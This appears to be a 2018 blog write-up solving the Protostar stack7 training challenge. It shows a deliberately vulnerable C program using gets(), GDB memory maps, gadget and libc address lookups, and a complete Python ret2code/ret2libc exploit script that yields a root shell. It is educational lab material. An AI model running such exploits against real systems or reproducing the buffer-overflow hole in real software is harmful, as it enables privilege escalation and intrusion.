---
title: Protostar Writeup - stack7
updated: 2018-10-14 16:30
---

## Protostar - stack7

Let's move on to the next level of Protostar. This is similar to the previous challenge.
Let's take a look at the code and see what differences are present.

```c

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
	char buffer[64];
	unsigned int ret;

	printf("input path please: "); fflush(stdout);

	gets(buffer);

	ret = __builtin_return_address(0);

	if((ret & 0xb0000000) == 0xb0000000) {
		printf("bzzzt (%p)\n", ret);
		_exit(1);
	}

	printf("got path %s\n", buffer);
	return strdup(buffer);
}

int main(int argc, char **argv)
{
	getpath();
}
```

So same stuff, but a different restriction on the return address... interesting. Let's take a look at what the address points to.

```sh
(gdb) break main
Breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.
(gdb) r
Starting program: /opt/protostar/bin/stack7 

Breakpoint 1, main (argc=1, argv=0xbffff864) at stack7/stack7.c:28
28      stack7/stack7.c: No such file or directory.
        in stack7/stack7.c
(gdb) info proc map
process 5409
cmdline = '/opt/protostar/bin/stack7'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack7'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fe0000 0xb7fe2000     0x2000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
```

As we can see from the map above, we're restricted from returning to libc. This is apparent from the `0xb00000000` check in the C code.
So how can we counter this? After digging a bit, I came across ret2code. Basically you make use of addresses of the binary itself.
From the map above it's clear that we can do so. But what do we do? That is the question. From the previous write up we know that we can
fake a stack frame and gain a root shell. Can we do that here somehow?

It is possible only if we can evade the check. If we do evade the check we can then reuse our ret2libc attack. Makes sense.
One way could be to immediately return from the function to completely avoid the check. This seems like a viable strategy.
There are many such ROP chains(of instructions) which can be used to craft our exploits. These instructions are also known as
ROP gadgets(pretty cool eh?).

Here's what a standard calling convention looks like taken from [here](https://en.wikipedia.org/wiki/X86_calling_conventions#Caller_clean-up).:

```nasm
caller:
        ; make new call frame (some compilers may produce an 'enter' instruction instead)
        push    ebp       ; save old call frame
        mov     ebp, esp  ; initialize new call frame
        ; push call arguments, in reverse (some compilers may subtract the required space from the
        ; stack pointer, then write each argument directly, see below. The 'enter' instruction can also do something similar)
        ; sub esp, 12 ; 'enter' instruction could do this for us
        ; mov [ebp-4], 3 ; or mov [esp+8], 3
        ; mov [ebp-8], 2  ; or mov [esp+4], 2
        ; mov [ebp-12], 1  ; or mov [esp], 1
        push    3
        push    2
        push    1
        call    callee    ; call subroutine 'callee'
        add     eax, 5    ; modify subroutine result (eax is the return value of our callee,
                          ; so we don't have to move it into a local variable)
        ; restore old call frame (some compilers may produce a 'leave' instruction instead)
        ; add   esp, 12   ; remove arguments from frame, ebp - esp = 12.
                          ; compilers will usually produce the following instead, which is just as fast,
                          ; and, unlike the add instruction, also works for variable length arguments
                          ; and variable length arrays allocated on the stack.
        mov     esp, ebp  ; most calling conventions dictate ebp be callee-saved,
                          ; i.e. it's preserved after calling the callee.
                          ; it therefore still points to the start of our stack frame.
                          ; we do need to make sure callee doesn't modify (or restores) ebp, though,
                          ; so we need to make sure it uses a calling convention which does this
        pop     ebp       ; restore old call frame
        ret               ; return
```

The instructions we're particularly interested in are the `pop x` and `ret` at the end of the above section.
Using those two instructions we can exit from a fucntion. Thinking of it we don't even need the `pop x`.
This simplifies our task. If we did have to use `pop` to restore the previous stack frame(which is not required in this case).
That's why a `ret` is sufficient.

Let's get started, first let's find the IP offset. Using our trustworthy pattern...

```python
>>> cyclic_metasploit(128)
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa...0Ab1Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
```

```sh
(gdb) r
Starting program: /opt/protostar/bin/stack7 
input path please: Aa0Aa1Aa2Aa3...Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7A...Ad6Ad7Ad8Ad9Ae0Ae1Ae

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

```python
>>> cyclic_metasploit_find(0x37634136)
80
```

So we know our padding is 80 bytes. Now lets get the address of ret from the binary...

```sh
$ objdump -D stack7 | grep ret
 8048383:       c3                      ret    
 8048494:       c3                      ret    
 ...
 80485f9:       c3                      ret    
 8048617:       c3                      ret    
```

Let's make use of the first address. Now we need the base address of libc which we have from the above proc map.
So that's at `0xb7e97000`. Now let's get the addresses of system and exit.

```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>
```

Notice how the functions are at within the restricted addresses. But this doesn't matter since we're avoiding the check.
That's why our ret2libc attack works again. One final thing we require is the shell string, which we can get the same way we did last time.

```sh
$ strings -a -t x /lib/libc-2.11.2.so
 11f3bf /bin/sh
```

Keep in mind that this is the offset and not the location of the shell string, we'll have to add this offset to libc's address to get the actual
address. Using all this, let's craft our exploit.

```python
import struct

padding = 'A' * 80

ret_addr = struct.pack("I", 0x8048383)
libc_start_addr = 0xb7e97000
shell_string_offset = 0x11f3bf
shell_string_addr = struct.pack("I", libc_start_addr + shell_string_offset)
system_addr = struct.pack("I", 0xb7ecffb0)
exit_addr = struct.pack("I", 0xb7ec60c0)

def go():
    payload = padding
    payload += ret_addr
    payload += system_addr
    payload += exit_addr
    payload += shell_string_addr
    print payload

go()
```

A quick and diry exploit, nothing fancy. Let's run it...

```sh
$ (python /tmp/exploit7.py; cat) | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```

Easy peasy. Those are all of the stack exploits. If you've come so far, then good job, you now have basic understanding of why bufferoverflows are bad.
A word of caution...these techniques dont work anymore...at least not this easily. You have protections like DEP and ASLR which are put in place to prevent these kinds of attacks.

P.S.: If you like this blog please do feel free to share it with your friends :).

